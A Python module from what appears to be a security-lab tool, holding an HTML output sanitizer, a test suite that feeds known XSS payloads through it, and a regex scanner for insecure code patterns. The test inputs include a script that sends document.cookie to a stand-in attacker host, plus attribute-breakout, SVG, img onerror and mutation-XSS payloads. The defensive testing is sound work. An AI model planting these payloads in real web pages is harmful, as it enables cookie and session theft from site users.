import html
import os
import re

from . import formatting


SUPPORT_DIR = os.path.join(os.path.dirname(__file__), "support")
DEFAULT_CODE_FILE = os.path.join(SUPPORT_DIR, "sample_vulnerable_code.py")


class WebOutputSanitizer:
    @staticmethod
    def encode_html_text(raw_input):
        if not raw_input:
            return ""
        return html.escape(raw_input, quote=True)

    @staticmethod
    def encode_html_attribute(raw_input):
        if not raw_input:
            return ""
        escaped = html.escape(raw_input, quote=True)

        def hex_match(match):
            return f"&#x{ord(match.group(0)):x};"

        return re.sub(r"[^a-zA-Z0-9./_-]", hex_match, escaped)


def run_xss_suite():
    formatting.page_title("XSS / OUTPUT SANITIZATION TEST SUITE", "Runs known XSS payloads through the sanitizer.")

    sanitizer = WebOutputSanitizer()
    cases = []

    stored = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
    safe_stored = sanitizer.encode_html_text(stored)
    cases.append(("Stored XSS Script Injection", "<script>" not in safe_stored))

    attribute = '" onmouseover="alert(1)'
    safe_attribute = sanitizer.encode_html_attribute(attribute)
    cases.append(("HTML Attribute Breakout", '"' not in safe_attribute and " " not in safe_attribute and "=" not in safe_attribute))

    svg = "<svg onload=alert('XSS')></svg>"
    safe_svg = sanitizer.encode_html_text(svg)
    cases.append(("SVG Event Handler XSS", "<svg" not in safe_svg))

    image = "<img src=x onerror=alert(1)>"
    safe_image = sanitizer.encode_html_text(image)
    cases.append(("Image Error Handler XSS", "<img" not in safe_image))

    mxss = "<math><mtext></math><img src=x onerror=alert('mXSS')>"
    safe_mxss = sanitizer.encode_html_text(mxss)
    cases.append(("Parser-Sensitive Mutation XSS", "<math" not in safe_mxss and "<img" not in safe_mxss))

    normal = "Welcome to the security lab."
    safe_normal = sanitizer.encode_html_text(normal)
    cases.append(("Normal User Input", safe_normal == normal))

    formatting.section("Test Results")
    rows = [(name, formatting.badge("PASS", "success") if passed else formatting.badge("FAIL", "danger")) for name, passed in cases]
    formatting.table(["TEST CASE", "RESULT"], rows)
    formatting.section_end()

    passed_count = sum(1 for _, passed in cases if passed)
    formatting.section("Summary")
    formatting.key_values([("Total tests", len(cases)), ("Passed", passed_count), ("Failed", len(cases) - passed_count)])
    formatting.section_end()


SIGNATURE_RULES = {
    "Unencrypted Connection": r"http://",
    "Hardcoded Password": r"password\s*=",
    "Hardcoded Secret/API Key": r"(secret_token|api_key)\s*=",
    "Dangerous eval()": r"\beval\s*\(",
    "OS Command Execution": r"os\.system\s*\(",
    "Debug Mode Enabled": r"debug\s*=\s*True",
}


def scan_code_lines(code_lines):
    findings = []
    for line_num, line in enumerate(code_lines, start=1):
        for rule_name, rule_regex in SIGNATURE_RULES.items():
            if re.search(rule_regex, line, re.IGNORECASE):
                findings.append((rule_name, line_num, line.strip()))
    return findings


def run_sast_scan():
    formatting.page_title("SAST SCANNER", "Signature-based static scan for common vulnerable code patterns.")

    if formatting.ask_yes_no("Scan the demo vulnerable code file", default_no=False):
        file_path = DEFAULT_CODE_FILE
    else:
        file_path = formatting.ask("Enter path to the Python file to scan", DEFAULT_CODE_FILE)

    try:
        with open(file_path, "r", encoding="utf-8") as file:
            code_lines = file.readlines()
    except FileNotFoundError:
        formatting.message(f"File not found: {file_path}", "danger")
        return
    except OSError as error:
        formatting.message(f"Could not read file: {error}", "danger")
        return

    findings = scan_code_lines(code_lines)

    formatting.section(f"Findings in {os.path.basename(file_path)}")
    if findings:
        formatting.table(
            ["RULE", "LINE", "CODE"],
            [(name, line_num, code[:40]) for name, line_num, code in findings],
        )
    else:
        formatting.message("No vulnerabilities found.", "success")
    formatting.section_end()

    formatting.section("Summary")
    formatting.key_values([("File scanned", file_path), ("Total findings", len(findings))])
    formatting.section_end()


def run():
    formatting.page_title("CODE SECURITY SCANNER", "XSS output sanitization tests, and SAST pattern scanning.")

    print()
    formatting.menu([
        ("XSS Sanitizer Test", "Test if unsafe input gets escaped"),
        ("SAST Scan", "Scan a file for insecure code"),
    ])

    choice = formatting.ask("Select a mode", "1")

    if choice == "2":
        run_sast_scan()
    else:
        run_xss_suite()
